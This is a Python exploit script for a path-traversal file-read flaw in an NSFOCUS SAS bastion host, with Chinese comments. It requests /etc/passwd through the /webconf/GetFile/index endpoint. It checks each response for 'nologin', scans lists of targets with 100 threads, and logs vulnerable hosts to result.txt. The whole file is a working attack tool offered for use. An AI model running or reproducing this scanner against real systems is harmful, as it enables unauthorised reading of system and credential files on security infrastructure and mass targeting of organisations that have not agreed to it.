import argparse,requests,sys,re,os,time  # 导包
from multiprocessing.dummy import Pool  # 导入多线程
requests.packages.urllib3.disable_warnings()  # 过滤报错


def banner():
    text = """███████╗██╗██╗     ███████╗        ██████╗ ███████╗ █████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝        ██╔══██╗██╔════╝██╔══██╗██╔══██╗
█████╗  ██║██║     █████╗          ██████╔╝█████╗  ███████║██║  ██║
██╔══╝  ██║██║     ██╔══╝          ██╔══██╗██╔══╝  ██╔══██║██║  ██║
██║     ██║███████╗███████╗███████╗██║  ██║███████╗██║  ██║██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
                                                                   
                                          version = 1.0.0                          
"""
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟-SAS堡垒机")  # 定义脚本信息
    parser.add_argument('-u','--url',type=str,dest='url',help='please input your url')   # 定义参数
    parser.add_argument('-f', '--file', type=str, dest='file', help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:   # 单个url
        poc(args.url)
    elif args.file and not args.url:  # 多线程
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:  # 读取输入的文件
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
    headers = {
        'Cache-Control':'max-age=0',
        'Sec-Ch-Ua':'"Not/A)Brand";v="8","Chromium";v="126","GoogleChrome";v="126"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/126.0.0.0Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Priority':'u=0,i',
        'Connection':'close',
    }
    proxies = {
            'http':'http://127.0.0.1:8080',
            'https':'http://127.0.0.1:8080',
        }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10,proxies=proxies)  # get发送请求
        # match = re.search(r"^(\w+):x:\d+:\d+::.*/bin/bash$",res.text,re.MULTILINE)
        # for i in match:
        if 'nologin' in res.text:  # 判断是否存在漏洞
            print(f'[+]{target}存在漏洞')
            with open('result.txt', 'a') as fp:  # 将漏洞写入到文件中
                fp.write(target + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        print('该站点存在问题')


if __name__ == '__main__':
    main()